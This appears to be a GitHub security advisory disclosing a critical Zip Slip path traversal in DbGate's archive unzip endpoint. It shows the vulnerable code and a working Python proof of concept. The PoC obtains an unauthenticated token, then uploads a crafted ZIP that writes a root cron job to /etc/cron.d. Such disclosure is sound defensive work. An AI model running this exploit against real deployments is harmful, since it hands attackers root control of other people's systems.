# [C] DbGate: Zip Slip in archive/unzip allows arbitrary file write leading to RCE

## Summary
Severity: Critical
Advisory: GHSA-h535-j5hr-mv56
CVE: CVE-2026-47669
CWE: CWE-22
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-06-05
Source: https://github.com/advisories/GHSA-h535-j5hr-mv56
Type: github-advisory

## Affected
- npm: `dbgate` — affected >=0 <7.1.9

## Details
The `unzipDirectory()` function in `packages/api/src/shell/unzipDirectory.js` (line 27) does not validate that extracted file paths stay within the output directory. A malicious ZIP with `../` entries writes files anywhere on the filesystem.

In the default Docker deployment, DbGate runs as root and the `none` auth provider issues JWT tokens without credentials via `POST /auth/login`, so this is exploitable by any network-adjacent attacker.

**Affected code:**

`packages/api/src/shell/unzipDirectory.js`, line 27:
```js
const destPath = path.join(outputDirectory, entry.fileName);
// No check that destPath stays within outputDirectory
```

Called from `packages/api/src/controllers/archive.js`, lines 291-293:
```js
async unzip({ folder }) {
    const newFolder = await this.getNewArchiveFolder({ database: folder.slice(0, -4) });
    await unzipDirectory(path.join(archivedir(), folder), path.join(archivedir(), newFolder));
```

The archive controller also has zero permission checks and zero path traversal protection on any of its endpoints.

**PoC:**

```python
import requests, zipfile, io

TARGET = "http://localhost:3000"

# Get auth token (no credentials needed in default Docker)
r = requests.post(f"{TARGET}/api/auth/login", json={"amoid": "none"})
token = r.json()["accessToken"]
hdrs = {"Authorization": f"Bearer {token}"}

# Create malicious ZIP with path traversal
buf = io.BytesIO()
with zipfile.ZipFile(buf, 'w') as zf:
    zf.writestr("../../../../../../etc/cron.d/dbgate-pwn",
                "* * * * * root id > /tmp/pwned\n")
buf.seek(0)

# Upload ZIP
r = requests.post(f"{TARGET}/api/uploads/upload", headers=hdrs,
                  files={"data": ("evil.zip", buf, "application/zip")})
info = r.json()

# Save to archive
requests.post(f"{TARGET}/api/archive/save-uploaded-zip", headers=hdrs,
              json={"filePath": info["filePath"], "fileName": "evil.zip"})

# Trigger Zip Slip - writes cron job to /etc/cron.d/
requests.post(f"{TARGET}/api/archive/unzip", headers=hdrs,
              json={"folder": "evil.zip"})
print("Check /tmp/pwned after 1 minute")
```

**Impact:** Arbitrary file write as root -> RCE. Full container compromise in Docker deployments.

## References
- https://github.com/dbgate/dbgate/security/advisories/GHSA-h535-j5hr-mv56
- https://github.com/dbgate/dbgate
- https://github.com/dbgate/dbgate/releases/tag/v7.1.9
